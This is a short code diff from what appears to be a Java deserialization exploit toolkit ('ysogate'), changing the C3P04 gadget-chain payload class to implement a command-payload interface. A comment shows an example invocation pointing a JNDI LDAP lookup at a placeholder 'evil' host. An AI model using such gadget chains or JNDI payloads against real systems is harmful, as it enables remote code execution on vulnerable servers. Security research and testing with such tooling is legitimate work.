@@ -3,7 +3,7 @@ package com.h2tg.ysogate.payloads.gadgets;
 import com.mchange.v2.c3p0.PoolBackedDataSource;
 import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;
 import org.apache.naming.ResourceRef;
-import com.h2tg.ysogate.payloads.ObjectPayload;
+import com.h2tg.ysogate.payloads.CommandObjectPayload;
 import com.h2tg.ysogate.annotation.Dependencies;
 import com.h2tg.ysogate.utils.HexUtils;
 import com.h2tg.ysogate.utils.Reflections;
@@ -42,7 +42,8 @@ import java.util.logging.Logger;
  * C3P04 'jndi-ldap://x.x.x.x/evil'
  */
 @Dependencies({"com.mchange:c3p0:0.9.5.2", "com.mchange:mchange-commons-java:0.2.11", "org.apache:tomcat:8.5.35", "org.yaml:snakeyaml:1.30"})
-public class C3P04 implements ObjectPayload<Object> {
+public class C3P04 implements CommandObjectPayload<Object>
+{
 
 	public Object getObject(String command) throws Exception {
 		int sep = command.lastIndexOf('-');
